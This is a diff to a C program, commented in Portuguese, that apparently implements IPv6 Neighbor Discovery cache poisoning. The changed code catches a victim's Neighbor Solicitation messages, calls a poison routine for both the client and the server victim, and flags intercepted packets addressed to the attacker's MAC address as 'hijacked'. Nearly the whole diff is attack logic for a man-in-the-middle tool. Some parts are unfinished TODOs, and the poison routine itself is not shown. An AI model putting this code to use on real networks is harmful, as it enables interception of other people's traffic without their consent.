@@ -82,6 +82,7 @@ void packet_action(char *packet) {
 	struct ip6_hdr *ip6;
 	struct icmp6_hdr *icmpv6;
 	struct tcphdr *tcp;
+	struct nd_neighbor_solicit *nd;
 
 	debug_packet(packet);
 
@@ -89,9 +90,26 @@ void packet_action(char *packet) {
 	ip6 = (struct ip6_hdr *)((char *)eth + sizeof(struct ethhdr));
 
 
-	/* Pacote para nossa vitima. */
-	if (!memcmp(&(ip6->ip6_dst), &(svictim.ipv6), sizeof(struct in6_addr))) {
+	switch (ip6->ip6_nxt) {
+		case IPPROTO_ICMPV6:
+			icmpv6 = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));
+			/* Se for uma solicitação de discover e o cliente ainda não foi
+			 * "poisoned", dispara o poison. */
+			if (icmpv6->icmp6_type == ND_NEIGHBOR_SOLICIT) {
+				nd = (struct nd_neighbor_solicit *)icmpv6;
+				if (!memcmp(&nd->nd_ns_target, &svictim.ipv6, sizeof(struct in6_addr))) {
+					/* TODO */
+					printf("Thread de poison para o client.\n");
+					/* Sempre que o client enviar um solicitation a gente vai
+					 * envenenar ambas as partes */
+					poison(cvictim);
+				}
+			}
+			break;
+	}
 
+	if (!memcmp(&(ip6->ip6_dst), &(svictim.ipv6), sizeof(struct in6_addr))) {
+		/* Pacote para nossa vitima. */
 		/* Por enquanto é apenas suportado 1 cliente */
 		if (!cvictim)
 			/* já faz o primeiro poison só prá deixar de ser otário */
@@ -100,6 +118,7 @@ void packet_action(char *packet) {
 		/* Se o mac destino for o do atacante, é pacote roubado */
 		if (memcmp(&(eth->h_dest), &(device.hwaddr), ETH_ALEN) == 0) {
 			printf("Packet Hijacked? :-)\n");
+			debug_packet(packet);
 			/* TODO */
 			switch (ip6->ip6_nxt) {
 				case IPPROTO_ICMPV6:
@@ -110,17 +129,6 @@ void packet_action(char *packet) {
 					break;
 				default:
 					break;
-			}
-		} else if (ip6->ip6_nxt == IPPROTO_ICMPV6) {
-			icmpv6 = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));
-			/* Se for uma solicitação de discover e o cliente ainda não foi
-			* "poisoned", dispara o poison. */
-			if (icmpv6->icmp6_type == ND_NEIGHBOR_SOLICIT) {
-				/* TODO */
-				printf("Thread de poison para o client.\n");
-				/* Sempre que o client enviar um solicitation a gente vai
-				* envenenar ambas as partes */
-				poison(cvictim);
 			}
 		}
 	} else if (!memcmp(&(ip6->ip6_src), &(svictim.ipv6), sizeof(struct in6_addr))) {
@@ -197,7 +205,7 @@ int main(int argc, char **argv) {
 						(struct sockaddr*)&packet_info,
 						(socklen_t *)&packet_info_size)) >= 0) {
 
-			debug_packet((char *)packet_buffer + sizeof(struct ethhdr *));
+			//debug_packet((char *)packet_buffer + sizeof(struct ethhdr *));
 			packet_action(packet_buffer);
 	}
 
